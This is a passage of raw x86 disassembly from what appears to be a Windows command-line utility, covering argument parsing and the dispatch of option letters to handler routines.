  405d2f:	cmp    eax,0x6
  405d32:	jb     0x405d68
  405d34:	push   0x4015c4
  405d39:	call   DWORD PTR ds:0x40e0a0
  405d3f:	test   eax,eax
  405d41:	je     0x405d68
  405d43:	push   esi
  405d44:	push   0x4015e0
  405d49:	push   eax
  405d4a:	call   DWORD PTR ds:0x40e0fc
  405d50:	mov    esi,eax
  405d52:	test   esi,esi
  405d54:	je     0x405d67
  405d56:	xor    eax,eax
  405d58:	mov    ecx,esi
  405d5a:	push   eax
  405d5b:	push   eax
  405d5c:	push   0x1
  405d5e:	push   eax
  405d5f:	call   DWORD PTR ds:0x40e20c
  405d65:	call   esi
  405d67:	pop    esi
  405d68:	mov    ecx,DWORD PTR [ebp-0x4]
  405d6b:	xor    ecx,ebp
  405d6d:	call   0x409090
  405d72:	mov    esp,ebp
  405d74:	pop    ebp
  405d75:	ret    
  405d76:	int3   
  405d77:	int3   
  405d78:	int3   
  405d79:	int3   
  405d7a:	int3   
  405d7b:	int3   
  405d7c:	mov    edi,edi
  405d7e:	push   ebp
  405d7f:	mov    ebp,esp
  405d81:	and    esp,0xfffffff8
  405d84:	mov    eax,0x27ec
  405d89:	call   0x409dd0
  405d8e:	mov    eax,ds:0x40b000
  405d93:	xor    eax,esp
  405d95:	mov    DWORD PTR [esp+0x27e8],eax
  405d9c:	push   ebx
  405d9d:	push   esi
  405d9e:	lea    eax,[esp+0xd8]
  405da5:	mov    DWORD PTR [esp+0xd0],0x1
  405db0:	push   edi
  405db1:	mov    DWORD PTR [esp+0xd0],eax
  405db8:	mov    edi,ecx
  405dba:	lea    eax,[esp+0xa60]
  405dc1:	mov    DWORD PTR [esp+0xa60],0x11c
  405dcc:	push   eax
  405dcd:	call   DWORD PTR ds:0x40e0d0
  405dd3:	xor    ebx,ebx
  405dd5:	test   eax,eax
  405dd7:	je     0x405e07
  405dd9:	push   ebx
  405dda:	push   0x4
  405ddc:	lea    eax,[esp+0x5c]
  405de0:	mov    BYTE PTR ds:0x40cc14,bl
  405de6:	push   eax
  405de7:	push   0x1a
  405de9:	call   DWORD PTR ds:0x40e08c
  405def:	push   eax
  405df0:	call   DWORD PTR ds:0x40e1ec
  405df6:	test   eax,eax
  405df8:	js     0x405e07
  405dfa:	cmp    DWORD PTR [esp+0x54],ebx
  405dfe:	je     0x405e07
  405e00:	mov    BYTE PTR ds:0x40cc14,0x1
  405e07:	mov    eax,ds:0x40b8c0
  405e0c:	xor    ecx,ecx
  405e0e:	mov    WORD PTR [eax],cx
  405e11:	mov    eax,ds:0x40b0b0
  405e16:	mov    WORD PTR [eax],cx
  405e19:	lea    eax,[esp+0x1fc]
  405e20:	mov    DWORD PTR [esp+0x1f4],0x104
  405e2b:	mov    DWORD PTR [esp+0x1f0],eax
  405e32:	call   DWORD PTR ds:0x40e07c
  405e38:	push   0x20
  405e3a:	mov    esi,eax
  405e3c:	pop    eax
  405e3d:	push   0x22
  405e3f:	pop    ecx
  405e40:	mov    DWORD PTR [esp+0x28],esi
  405e44:	cmp    WORD PTR [esi],cx
  405e47:	jne    0x405e52
  405e49:	add    esi,0x2
  405e4c:	mov    DWORD PTR [esp+0x28],esi
  405e50:	jmp    0x405e54
  405e52:	mov    ecx,eax
  405e54:	movzx  eax,WORD PTR [esi]
  405e57:	test   ax,ax
  405e5a:	je     0x405e7c
  405e5c:	cmp    ax,cx
  405e5f:	je     0x405e6c
  405e61:	add    esi,0x2
  405e64:	movzx  eax,WORD PTR [esi]
  405e67:	test   ax,ax
  405e6a:	jne    0x405e5c
  405e6c:	mov    DWORD PTR [esp+0x28],esi
  405e70:	cmp    WORD PTR [esi],bx
  405e73:	je     0x405e7c
  405e75:	add    esi,0x2
  405e78:	mov    DWORD PTR [esp+0x28],esi
  405e7c:	push   0xfffffff5
  405e7e:	mov    DWORD PTR ds:0x40cc18,edi
  405e84:	call   DWORD PTR ds:0x40e0f0
  405e8a:	mov    ds:0x40c430,eax
  405e8f:	cmp    eax,0xffffffff
  405e92:	je     0x405ea0
  405e94:	push   eax
  405e95:	call   DWORD PTR ds:0x40e10c
  405e9b:	cmp    eax,0x3
  405e9e:	je     0x405ea6
  405ea0:	mov    DWORD PTR ds:0x40c430,ebx
  405ea6:	xor    eax,eax
  405ea8:	mov    DWORD PTR [esp+0x74],ebx
  405eac:	mov    edi,0x7fe
  405eb1:	mov    WORD PTR [esp+0xff0],ax
  405eb9:	push   edi
  405eba:	lea    eax,[esp+0xff6]
  405ec1:	push   ebx
  405ec2:	push   eax
  405ec3:	call   0x409b76
  405ec8:	add    esp,0xc
  405ecb:	xor    eax,eax
  405ecd:	mov    WORD PTR [esp+0x17f0],ax
  405ed5:	lea    eax,[esp+0x17f2]
  405edc:	push   edi
  405edd:	push   ebx
  405ede:	push   eax
  405edf:	call   0x409b76
  405ee4:	add    esp,0xc
  405ee7:	mov    DWORD PTR [esp+0x60],ebx
  405eeb:	lea    eax,[esp+0xff0]
  405ef2:	mov    DWORD PTR ds:0x40cc24,ebx
  405ef8:	mov    DWORD PTR [esp+0x2c],eax
  405efc:	lea    eax,[esp+0x17f0]
  405f03:	mov    DWORD PTR [esp+0x20],eax
  405f07:	push   0x9
  405f09:	pop    ecx
  405f0a:	push   0x20
  405f0c:	pop    edi
  405f0d:	movzx  eax,WORD PTR [esi]
  405f10:	cmp    ax,di
  405f13:	je     0x405f1a
  405f15:	cmp    ax,cx
  405f18:	jne    0x405f1f
  405f1a:	add    esi,0x2
  405f1d:	jmp    0x405f0d
  405f1f:	movzx  eax,WORD PTR [esi]
  405f22:	push   0x2d
  405f24:	pop    ecx
  405f25:	push   0x2f
  405f27:	pop    edx
  405f28:	mov    DWORD PTR [esp+0x28],esi
  405f2c:	cmp    ax,dx
  405f2f:	je     0x405f3a
  405f31:	cmp    ax,cx
  405f34:	jne    0x406073
  405f3a:	lea    eax,[esi+0x2]
  405f3d:	test   eax,eax
  405f3f:	je     0x406073
  405f45:	mov    ax,WORD PTR [eax]
  405f48:	or     ax,di
  405f4b:	cmp    ax,0x60
  405f4f:	jne    0x406073
  405f55:	add    esi,0x4
  405f58:	lea    ecx,[esp+0x1c]
  405f5c:	mov    DWORD PTR [esp+0x1c],esi
  405f60:	call   0x405855
  405f65:	lea    eax,[esp+0xff0]
  405f6c:	push   0x400
  405f71:	lea    edx,[esp+0x38]
  405f75:	mov    DWORD PTR [esp+0x38],eax
  405f79:	call   0x405a62
  405f7e:	pop    ecx
  405f7f:	test   al,al
  405f81:	je     0x4068c7
  405f87:	mov    eax,DWORD PTR [esp+0x1f4]
  405f8e:	mov    edx,0x4015f8
  405f93:	add    eax,eax
  405f95:	mov    DWORD PTR [esp+0x40],ebx
  405f99:	mov    DWORD PTR [esp+0x44],eax
  405f9d:	lea    eax,[esp+0x48]
  405fa1:	push   eax
  405fa2:	push   ecx
  405fa3:	push   ecx
  405fa4:	call   0x402957
  405fa9:	add    esp,0xc
  405fac:	test   eax,eax
  405fae:	jne    0x4075a8
  405fb4:	lea    eax,[esp+0x44]
  405fb8:	push   eax
  405fb9:	push   DWORD PTR [esp+0x1f4]
  405fc0:	lea    eax,[esp+0x48]
  405fc4:	push   eax
  405fc5:	push   ebx
  405fc6:	lea    eax,[esp+0x1000]
  405fcd:	push   eax
  405fce:	push   DWORD PTR [esp+0x5c]
  405fd2:	call   DWORD PTR ds:0x40e020
  405fd8:	mov    esi,eax
  405fda:	cmp    esi,0xea
  405fe0:	jne    0x40602f
  405fe2:	mov    eax,DWORD PTR [esp+0x44]
  405fe6:	push   ecx
  405fe7:	shr    eax,1
  405fe9:	lea    ecx,[esp+0x1f4]
  405ff0:	push   eax
  405ff1:	call   0x4080c3
  405ff6:	test   al,al
  405ff8:	jne    0x406009
  405ffa:	push   DWORD PTR [esp+0x48]
  405ffe:	call   DWORD PTR ds:0x40e06c
  406004:	jmp    0x4060a2
  406009:	lea    eax,[esp+0x44]
  40600d:	push   eax
  40600e:	push   DWORD PTR [esp+0x1f4]
  406015:	lea    eax,[esp+0x48]
  406019:	push   eax
  40601a:	push   ebx
  40601b:	lea    eax,[esp+0x1000]
  406022:	push   eax
  406023:	push   DWORD PTR [esp+0x5c]
  406027:	call   DWORD PTR ds:0x40e020
  40602d:	mov    esi,eax
  40602f:	push   DWORD PTR [esp+0x48]
  406033:	call   DWORD PTR ds:0x40e06c
  406039:	test   esi,esi
  40603b:	jne    0x4075a8
  406041:	cmp    DWORD PTR [esp+0x40],0x1
  406046:	jne    0x4075a8
  40604c:	mov    esi,DWORD PTR [esp+0x1f0]
  406053:	push   0x20
  406055:	pop    ecx
  406056:	movzx  edi,WORD PTR [esi]
  406059:	mov    DWORD PTR [esp+0x1c],esi
  40605d:	cmp    di,cx
  406060:	je     0x40606e
  406062:	push   0x9
  406064:	pop    eax
  406065:	cmp    di,ax
  406068:	jne    0x4064b3
  40606e:	add    esi,0x2
  406071:	jmp    0x406056
  406073:	lea    eax,[esp+0x30]
  406077:	mov    DWORD PTR [esp+0x30],ebx
  40607b:	push   eax
  40607c:	mov    ecx,esi
  40607e:	call   0x40288c
  406083:	test   eax,eax
  406085:	js     0x40643c
  40608b:	mov    eax,DWORD PTR [esp+0x30]
  40608f:	push   ecx
  406090:	inc    eax
  406091:	lea    ecx,[esp+0x1f4]
  406098:	push   eax
  406099:	call   0x4080c3
  40609e:	test   al,al
  4060a0:	jne    0x4060aa
  4060a2:	push   0xe
  4060a4:	pop    ebx
  4060a5:	jmp    0x4075a8
  4060aa:	mov    eax,DWORD PTR [esp+0x1f0]
  4060b1:	lea    edi,[esp+0xc2c]
  4060b8:	xor    ecx,ecx
  4060ba:	mov    DWORD PTR [esp+0xb90],0x401680
  4060c5:	mov    esi,0x4017f4
  4060ca:	mov    DWORD PTR [esp+0xb94],ebx
  4060d1:	push   0x8
  4060d3:	mov    WORD PTR [eax],cx
  4060d6:	mov    edx,0x4016a4
  4060db:	mov    eax,ds:0x4017e4
  4060e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e1:	mov    DWORD PTR [esp+0xc10],eax
  4060e8:	mov    ax,ds:0x4017e8
  4060ee:	mov    WORD PTR [esp+0xc14],ax
  4060f6:	mov    eax,ds:0x4017ec
  4060fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060fc:	mov    DWORD PTR [esp+0xc18],eax
  406103:	mov    ax,ds:0x4017f0
  406109:	pop    ecx
  40610a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40610b:	mov    WORD PTR [esp+0xc18],ax
  406113:	lea    eax,[esp+0x3c]
  406117:	push   eax
  406118:	mov    BYTE PTR [esp+0xb9c],bl
  40611f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  406121:	mov    esi,0x401804
  406126:	mov    DWORD PTR [esp+0xba0],0x401690
  406131:	lea    edi,[esp+0xc40]
  406138:	mov    DWORD PTR [esp+0xba4],ebx
  40613f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406141:	mov    ecx,edx
  406143:	mov    BYTE PTR [esp+0xba8],bl
  40614a:	mov    DWORD PTR [esp+0xbac],edx
  406151:	mov    DWORD PTR [esp+0xbb0],0x4016b4
  40615c:	mov    BYTE PTR [esp+0xbb4],0x1
  406164:	mov    DWORD PTR [esp+0xbb8],0x4016bc
  40616f:	mov    DWORD PTR [esp+0xbbc],0x4016c8
  40617a:	mov    BYTE PTR [esp+0xbc0],0x1
  406182:	mov    DWORD PTR [esp+0xbc4],0x4016d0
  40618d:	mov    DWORD PTR [esp+0xbc8],0x4016dc
  406198:	mov    BYTE PTR [esp+0xbcc],0x1
  4061a0:	mov    DWORD PTR [esp+0xbd0],0x4016e4
  4061ab:	mov    DWORD PTR [esp+0xbd4],0x4016f4
  4061b6:	mov    BYTE PTR [esp+0xbd8],0x1
  4061be:	mov    DWORD PTR [esp+0xbdc],0x401720
  4061c9:	mov    DWORD PTR [esp+0xbe0],0x401734
  4061d4:	mov    BYTE PTR [esp+0xbe4],0x1
  4061dc:	mov    DWORD PTR [esp+0xbe8],0x401760
  4061e7:	mov    DWORD PTR [esp+0xbec],0x40177c
  4061f2:	mov    BYTE PTR [esp+0xbf0],0x1
  4061fa:	mov    DWORD PTR [esp+0xbf4],0x401798
  406205:	mov    DWORD PTR [esp+0xbf8],0x4017b4
  406210:	mov    BYTE PTR [esp+0xbfc],0x1
  406218:	mov    DWORD PTR [esp+0xc00],0x4017d4
  406223:	mov    DWORD PTR [esp+0xc04],0x4017dc
  40622e:	mov    BYTE PTR [esp+0xc08],0x1
  406236:	mov    DWORD PTR [esp+0x40],ebx
  40623a:	call   0x40288c
  40623f:	test   eax,eax
  406241:	js     0x40643c
  406247:	mov    esi,DWORD PTR [esp+0x28]
  40624b:	mov    DWORD PTR [esp+0x50],esi
  40624f:	mov    DWORD PTR [esp+0x10],ebx
  406253:	jmp    0x4062ce
  406255:	movzx  eax,WORD PTR [edi]
  406258:	test   ax,ax
  40625b:	je     0x4062e5
  406261:	push   0x2d
  406263:	pop    ecx
  406264:	cmp    ax,cx
  406267:	je     0x406271
  406269:	push   0x2f
  40626b:	pop    ecx
  40626c:	cmp    ax,cx
  40626f:	jne    0x4062ce
  406271:	mov    eax,DWORD PTR [esp+0x10]
  406275:	lea    ecx,[eax-0x1]
  406278:	mov    DWORD PTR [esp+0x54],ecx
  40627c:	cmp    ecx,0x1
  40627f:	jne    0x4062a7
  406281:	push   0xffffffff
  406283:	push   0x401824
  406288:	dec    eax
  406289:	push   eax
  40628a:	lea    eax,[edi+0x2]
  40628d:	push   eax
  40628e:	push   ecx
  40628f:	push   0x409
  406294:	call   DWORD PTR ds:0x40e0dc
  40629a:	cmp    eax,0x2
  40629d:	je     0x40631e
  40629f:	mov    eax,DWORD PTR [esp+0x10]
  4062a3:	mov    ecx,DWORD PTR [esp+0x54]
  4062a7:	cmp    DWORD PTR [esp+0x3c],ecx
  4062ab:	jne    0x4062ce
  4062ad:	push   DWORD PTR [esp+0x3c]
  4062b1:	dec    eax
  4062b2:	push   0x4016a4
  4062b7:	push   eax
  4062b8:	lea    eax,[edi+0x2]
  4062bb:	push   eax
  4062bc:	push   0x1
  4062be:	push   0x409
  4062c3:	call   DWORD PTR ds:0x40e0dc
  4062c9:	cmp    eax,0x2
  4062cc:	je     0x40631e
  4062ce:	lea    edx,[esp+0x10]
  4062d2:	lea    ecx,[esp+0x50]
  4062d6:	call   0x403b26
  4062db:	mov    edi,eax
  4062dd:	test   edi,edi
  4062df:	jne    0x406255
  4062e5:	lea    eax,[esp+0xc14]
  4062ec:	mov    BYTE PTR [esp+0xb98],0x1
  4062f4:	mov    DWORD PTR [esp+0xb94],eax
  4062fb:	lea    eax,[esp+0xc0c]
  406302:	mov    BYTE PTR [esp+0xba4],0x1
  40630a:	mov    DWORD PTR [esp+0xba0],eax
  406311:	mov    DWORD PTR [esp+0x50],esi
  406315:	mov    DWORD PTR [esp+0x10],ebx
  406319:	jmp    0x40640a
  40631e:	lea    eax,[esp+0xc2c]
  406325:	mov    BYTE PTR [esp+0xb98],bl
  40632c:	mov    DWORD PTR [esp+0xb94],eax
  406333:	lea    eax,[esp+0xc3c]
  40633a:	mov    BYTE PTR [esp+0xba4],bl
  406341:	jmp    0x40630a
  406343:	movzx  eax,WORD PTR [esi]
  406346:	test   ax,ax
  406349:	je     0x406421
  40634f:	push   0x2d
  406351:	pop    ecx
  406352:	cmp    ax,cx
  406355:	je     0x40635f
  406357:	push   0x2f
  406359:	pop    ecx
  40635a:	cmp    ax,cx
  40635d:	jne    0x4063a8
  40635f:	mov    ecx,DWORD PTR [esp+0x10]
  406363:	lea    eax,[esp+0xb90]
  40636a:	dec    ecx
  40636b:	mov    DWORD PTR [esp+0x4c],eax
  40636f:	mov    edi,ebx
  406371:	mov    DWORD PTR [esp+0x54],ecx
  406375:	lea    edx,[esi+0x2]
  406378:	push   0xffffffff
  40637a:	push   DWORD PTR [eax]
  40637c:	push   ecx
  40637d:	push   edx
  40637e:	push   0x1
  406380:	push   0x409
  406385:	call   DWORD PTR ds:0x40e0dc
  40638b:	cmp    eax,0x2
  40638e:	je     0x4063bd
  406390:	mov    eax,DWORD PTR [esp+0x4c]
  406394:	lea    edx,[esi+0x2]
  406397:	mov    ecx,DWORD PTR [esp+0x54]
  40639b:	inc    edi
  40639c:	add    eax,0xc
  40639f:	mov    DWORD PTR [esp+0x4c],eax
  4063a3:	cmp    edi,0xa
  4063a6:	jb     0x406378
  4063a8:	push   0x1
  4063aa:	push   DWORD PTR [esp+0x14]
  4063ae:	mov    DWORD PTR [esp+0x200],0x104
  4063b9:	mov    edx,esi
  4063bb:	jmp    0x4063f8
  4063bd:	imul   esi,edi,0xc
  4063c0:	lea    eax,[esp+0x38]
  4063c4:	push   eax
  4063c5:	mov    DWORD PTR [esp+0x1fc],0x104
  4063d0:	mov    DWORD PTR [esp+0x3c],ebx
  4063d4:	mov    ecx,DWORD PTR [esp+esi*1+0xb98]
  4063db:	call   0x40288c
  4063e0:	test   eax,eax
  4063e2:	js     0x406446
  4063e4:	movzx  eax,BYTE PTR [esp+esi*1+0xb98]
  4063ec:	mov    edx,DWORD PTR [esp+esi*1+0xb94]
  4063f3:	push   eax
  4063f4:	push   DWORD PTR [esp+0x3c]
  4063f8:	lea    ecx,[esp+0x1f8]
  4063ff:	call   0x403c2a
  406404:	pop    ecx
  406405:	pop    ecx
  406406:	test   eax,eax
  406408:	jne    0x40644b
  40640a:	lea    edx,[esp+0x10]
  40640e:	lea    ecx,[esp+0x50]
  406412:	call   0x403b26
  406417:	mov    esi,eax
  406419:	test   esi,esi
  40641b:	jne    0x406343
  406421:	mov    esi,DWORD PTR [esp+0x1f0]
  406428:	lea    eax,[esp+0x30]
  40642c:	push   eax
  40642d:	mov    ecx,esi
  40642f:	mov    DWORD PTR [esp+0x34],ebx
  406433:	call   0x40288c
  406438:	test   eax,eax
  40643a:	jns    0x406452
  40643c:	mov    ebx,0x65b
  406441:	jmp    0x4075a8
  406446:	mov    eax,0x65b
  40644b:	mov    ebx,eax
  40644d:	jmp    0x4075a8
  406452:	mov    eax,DWORD PTR [esp+0x30]
  406456:	test   eax,eax
  406458:	je     0x406486
  40645a:	push   0x20
  40645c:	dec    eax
  40645d:	pop    edi
  40645e:	push   0x9
  406460:	pop    edx
  406461:	lea    eax,[esi+eax*2]
  406464:	movzx  ecx,WORD PTR [eax]
  406467:	cmp    cx,di
  40646a:	je     0x406471
  40646c:	cmp    cx,dx
  40646f:	jne    0x406486
  406471:	cmp    eax,esi
  406473:	jb     0x406486
  406475:	xor    ecx,ecx
  406477:	mov    WORD PTR [eax],cx
  40647a:	sub    eax,0x2
  40647d:	mov    esi,DWORD PTR [esp+0x1f0]
  406484:	jmp    0x406464
  406486:	movzx  edi,WORD PTR [esi]
  406489:	mov    DWORD PTR [esp+0x1c],esi
  40648d:	push   0x20
  40648f:	pop    ecx
  406490:	test   di,di
  406493:	je     0x4064b3
  406495:	push   0x9
  406497:	pop    ebx
  406498:	cmp    di,cx
  40649b:	je     0x4064a2
  40649d:	cmp    di,bx
  4064a0:	jne    0x4064b1
  4064a2:	add    esi,0x2
  4064a5:	mov    DWORD PTR [esp+0x1c],esi
  4064a9:	movzx  edi,WORD PTR [esi]
  4064ac:	test   di,di
  4064af:	jne    0x406498
  4064b1:	xor    ebx,ebx
  4064b3:	mov    DWORD PTR [esp+0x24],ebx
  4064b7:	mov    DWORD PTR [esp+0x90],0x46
  4064c2:	push   0x45
  4064c4:	pop    edx
  4064c5:	test   di,di
  4064c8:	je     0x4068db
  4064ce:	mov    eax,ds:0x40cc20
  4064d3:	mov    DWORD PTR [esp+0x10],eax
  4064d7:	push   0x2f
  4064d9:	pop    eax
  4064da:	cmp    di,ax
  4064dd:	je     0x40658a
  4064e3:	push   0x2d
  4064e5:	pop    eax
  4064e6:	cmp    di,ax
  4064e9:	je     0x40658a
  4064ef:	push   0x208
  4064f4:	lea    eax,[esp+0x858]
  4064fb:	push   ebx
  4064fc:	push   eax
  4064fd:	call   0x409b76
  406502:	add    esp,0xc
  406505:	lea    eax,[esp+0x854]
  40650c:	mov    edi,0x104
  406511:	mov    DWORD PTR [esp+0x848],eax
  406518:	lea    edx,[esp+0x848]
  40651f:	mov    DWORD PTR [esp+0x84c],edi
  406526:	lea    ecx,[esp+0x1c]
  40652a:	mov    DWORD PTR [esp+0x850],edi
  406531:	call   0x405aa1
  406536:	test   eax,eax
  406538:	je     0x406884
  40653e:	mov    esi,DWORD PTR [esp+0x848]
  406545:	test   esi,esi
  406547:	je     0x406557
  406549:	mov    ecx,esi
  40654b:	call   0x40406a
  406550:	mov    esi,DWORD PTR [esp+0x848]
  406557:	lea    ecx,[esp+0x1c]
  40655b:	call   0x405855
  406560:	cmp    DWORD PTR [esp+0x84c],0x104
  40656b:	movzx  edi,ax
  40656e:	jle    0x40657b
  406570:	test   esi,esi
  406572:	je     0x40657b
  406574:	push   esi
  406575:	call   DWORD PTR ds:0x40e104
  40657b:	mov    esi,DWORD PTR ds:0x40cc20
  406581:	mov    DWORD PTR [esp+0x10],esi
  406585:	jmp    0x406873
  40658a:	add    esi,0x2
  40658d:	mov    DWORD PTR [esp+0x1c],esi
  406591:	movzx  eax,WORD PTR [esi]
  406594:	mov    edx,eax
  406596:	or     edx,ecx
  406598:	xor    ecx,ecx
  40659a:	cmp    cx,ax
  40659d:	je     0x4065a6
  40659f:	add    esi,0x2
  4065a2:	mov    DWORD PTR [esp+0x1c],esi
  4065a6:	push   0x52
  4065a8:	pop    eax
  4065a9:	push   0x20
  4065ab:	mov    ecx,0x401f60
  4065b0:	pop    edi
  4065b1:	movzx  eax,ax
  4065b4:	or     eax,edi
  4065b6:	cmp    eax,edx
  4065b8:	je     0x4065c5
  4065ba:	add    ecx,0x2
  4065bd:	movzx  eax,WORD PTR [ecx]
  4065c0:	test   ax,ax
  4065c3:	jne    0x4065b1
  4065c5:	movzx  edi,WORD PTR [ecx]
  4065c8:	mov    DWORD PTR [esp+0x30],ecx
  4065cc:	test   di,di
  4065cf:	je     0x4067e6
  4065d5:	movzx  eax,WORD PTR [esi]
  4065d8:	push   0x20
  4065da:	pop    ecx
  4065db:	cmp    ax,cx
  4065de:	je     0x4065f6
  4065e0:	test   ax,ax
  4065e3:	je     0x4065f6
  4065e5:	push   0x9
  4065e7:	pop    ecx
  4065e8:	cmp    ax,cx
  4065eb:	je     0x4065f6
  4065ed:	xor    esi,esi
  4065ef:	inc    esi
  4065f0:	mov    DWORD PTR [esp+0x38],esi
  4065f4:	jmp    0x4065fc
  4065f6:	mov    esi,ebx
  4065f8:	mov    DWORD PTR [esp+0x38],ebx
  4065fc:	lea    ecx,[esp+0x1c]
  406600:	call   0x405855
  406605:	push   0x63
  406607:	pop    ecx
  406608:	lea    eax,[esp+0xff0]
  40660f:	mov    DWORD PTR [esp+0x34],eax
  406613:	cmp    di,cx
  406616:	jne    0x406620
  406618:	test   esi,esi
  40661a:	jne    0x4067e6
  406620:	push   0x50
  406622:	pop    eax
  406623:	cmp    di,ax
  406626:	jne    0x406685
  406628:	push   ecx
  406629:	push   DWORD PTR [esp+0x20]
  40662d:	call   DWORD PTR ds:0x40e0ec
  406633:	add    eax,0xa
  406636:	lea    ecx,[esp+0xd4]
  40663d:	push   eax
  40663e:	call   0x407f90
  406643:	test   al,al
  406645:	je     0x4068bf
  40664b:	mov    eax,DWORD PTR [esp+0xd0]
  406652:	lea    edx,[esp+0x88]
  406659:	push   DWORD PTR [esp+0xd4]
  406660:	lea    ecx,[esp+0x20]
  406664:	mov    DWORD PTR [esp+0x8c],eax
  40666b:	call   0x405a62
  406670:	pop    ecx
  406671:	test   al,al
  406673:	je     0x4068c7
  406679:	mov    esi,DWORD PTR ds:0x40cc20
  40667f:	mov    DWORD PTR [esp+0x10],esi
  406683:	jmp    0x4066b5
  406685:	push   0x71
  406687:	pop    eax
  406688:	cmp    di,ax
  40668b:	je     0x406692
  40668d:	cmp    di,cx
  406690:	jne    0x406696
  406692:	test   esi,esi
  406694:	je     0x4066b1
  406696:	push   0x400
  40669b:	lea    edx,[esp+0x38]
  40669f:	lea    ecx,[esp+0x20]
  4066a3:	call   0x405a62
  4066a8:	pop    ecx
  4066a9:	test   al,al
  4066ab:	je     0x4068c7
  4066b1:	mov    esi,DWORD PTR [esp+0x10]
  4066b5:	lea    ecx,[esp+0x1c]
  4066b9:	call   0x405855
  4066be:	mov    ecx,DWORD PTR [esp+0x30]
  4066c2:	push   0x46
  4066c4:	movzx  edi,ax
  4066c7:	pop    edx
  4066c8:	movzx  eax,WORD PTR [ecx]
  4066cb:	cmp    ax,dx
  4066ce:	je     0x4066e2
  4066d0:	push   0x71
  4066d2:	pop    edx
  4066d3:	cmp    ax,dx
  4066d6:	je     0x4066e2
  4066d8:	cmp    eax,0x4a
  4066db:	je     0x4066e2
  4066dd:	cmp    eax,0x6c
  4066e0:	jne    0x406741
  4066e2:	cmp    DWORD PTR [esp+0x38],0x0
  4066e7:	je     0x406741
  4066e9:	lea    esi,[esp+0x17f0]
  4066f0:	lea    edx,[esp+0x17f0]
  4066f7:	mov    DWORD PTR [esp+0x2c],esi
  4066fb:	push   0x71
  4066fd:	pop    esi
  4066fe:	mov    DWORD PTR [esp+0x34],edx
  406702:	cmp    ax,si
  406705:	mov    esi,DWORD PTR [esp+0x10]
  406709:	lea    edx,[esp+0xff0]
  406710:	mov    DWORD PTR [esp+0x20],edx
  406714:	je     0x406745
  406716:	push   0x400
  40671b:	lea    edx,[esp+0x38]
  40671f:	lea    ecx,[esp+0x20]
  406723:	call   0x405a62
  406728:	pop    ecx
  406729:	test   al,al
  40672b:	je     0x4068c7
  406731:	lea    ecx,[esp+0x1c]
  406735:	call   0x405855
  40673a:	mov    ecx,DWORD PTR [esp+0x30]
  40673e:	movzx  edi,ax
  406741:	mov    edx,DWORD PTR [esp+0x20]
  406745:	movzx  eax,WORD PTR [ecx]
  406748:	cmp    eax,0x61
  40674b:	jb     0x406785
  40674d:	cmp    eax,0x7a
  406750:	ja     0x406785
  406752:	push   DWORD PTR [esp+0x2c]
  406756:	sub    ecx,0x401f60
  40675c:	sar    ecx,1
  40675e:	push   edx
  40675f:	mov    esi,DWORD PTR [ecx*4+0x402020]
  406766:	mov    ecx,esi
  406768:	call   DWORD PTR ds:0x40e20c
  40676e:	call   esi
  406770:	pop    ecx
  406771:	pop    ecx
  406772:	test   eax,eax
  406774:	jne    0x4067e6
  406776:	mov    esi,DWORD PTR ds:0x40cc20
  40677c:	mov    DWORD PTR [esp+0x10],esi
  406780:	jmp    0x406849
  406785:	push   0x50
  406787:	test   esi,esi
  406789:	je     0x4067f9
  40678b:	pop    edx
  40678c:	push   0x41
  40678e:	pop    ecx
  40678f:	cmp    ax,dx
  406792:	jne    0x4067cf
  406794:	cmp    WORD PTR [esi],cx
  406797:	jne    0x4067cf
  406799:	lea    edx,[esp+0x1ff0]
  4067a0:	call   0x404dad
  4067a5:	test   eax,eax
  4067a7:	jne    0x4067e6
  4067a9:	mov    eax,DWORD PTR [esp+0x20]
  4067ad:	lea    ecx,[esp+0xc5c]
  4067b4:	mov    esi,DWORD PTR [esp+0x30]
  4067b8:	push   0x1e
  4067ba:	push   eax
  4067bb:	push   0x1e
  4067bd:	pop    edx
  4067be:	mov    DWORD PTR [esp+0x18],esi
  4067c2:	mov    DWORD PTR ds:0x40cc20,esi
  4067c8:	call   0x402713
  4067cd:	jmp    0x406849
  4067cf:	cmp    WORD PTR [esi],dx
  4067d2:	jne    0x4067e6
  4067d4:	cmp    ax,cx
  4067d7:	jne    0x4067e6
  4067d9:	mov    edx,DWORD PTR [esp+0x2c]
  4067dd:	call   0x404dad
  4067e2:	test   eax,eax
  4067e4:	je     0x406849
  4067e6:	call   0x403cda
  4067eb:	mov    esi,0x667
  4067f0:	mov    DWORD PTR [esp+0x24],esi
  4067f4:	jmp    0x406a0e
  4067f9:	mov    esi,ecx
  4067fb:	pop    ecx
  4067fc:	mov    DWORD PTR [esp+0x10],esi
  406800:	mov    DWORD PTR ds:0x40cc20,esi
  406806:	cmp    ax,cx
  406809:	je     0x406823
  40680b:	mov    eax,0x400
  406810:	lea    ecx,[esp+0x1ff0]
  406817:	push   eax
  406818:	push   DWORD PTR [esp+0x30]
  40681c:	mov    edx,eax
  40681e:	call   0x402713
  406823:	mov    eax,DWORD PTR [esp+0x20]
  406827:	lea    ecx,[esp+0xc5c]
  40682e:	push   0x1e
  406830:	push   eax
  406831:	push   0x1e
  406833:	pop    edx
  406834:	call   0x402713
  406839:	mov    ecx,DWORD PTR [esp+0x30]
  40683d:	push   0x45
  40683f:	pop    edx
  406840:	cmp    WORD PTR [ecx],dx
  406843:	je     0x4068e1
  406849:	lea    eax,[esp+0xff0]
  406850:	mov    DWORD PTR [esp+0x2c],eax
  406854:	xor    eax,eax
  406856:	mov    WORD PTR [esp+0xff0],ax
  40685e:	lea    eax,[esp+0x17f0]
  406865:	mov    DWORD PTR [esp+0x20],eax
  406869:	xor    eax,eax
  40686b:	mov    WORD PTR [esp+0x17f0],ax
  406873:	test   di,di
  406876:	je     0x4068d6
  406878:	mov    esi,DWORD PTR [esp+0x1c]
  40687c:	push   0x20
  40687e:	pop    ecx
  40687f:	jmp    0x4064d7
  406884:	call   0x403cda
  406889:	mov    esi,0x667
  40688e:	mov    DWORD PTR [esp+0x24],esi
  406892:	cmp    DWORD PTR [esp+0x84c],edi
  406899:	jle    0x406a0e
  40689f:	cmp    DWORD PTR [esp+0x848],0x0
  4068a7:	je     0x406a0e
  4068ad:	push   DWORD PTR [esp+0x848]
  4068b4:	call   DWORD PTR ds:0x40e104
  4068ba:	jmp    0x406a0e
  4068bf:	push   0xe
